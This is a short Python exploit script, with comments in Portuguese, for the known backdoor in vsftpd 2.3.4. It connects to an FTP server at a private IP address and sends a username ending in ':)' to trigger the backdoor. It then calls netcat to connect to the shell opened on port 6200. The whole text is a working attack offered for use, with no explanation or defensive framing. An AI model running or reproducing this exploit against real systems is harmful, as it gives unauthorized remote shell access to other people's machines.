#!/usr/share/python
# Data: 22/06/22
# Criador: Reinaldo Garcia
# Versão: 1.0
# Descrição: Exploit para abusar do backdoor do vsftpd versão 2.3.4

import socket,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.1.5",21))
r = s.recv(1024)

s.send("USER king:)\r\n")
s.send("PASS huaisehruiaeshriuasr\r\n")

os.system("nc -v 172.16.1.5 6200")
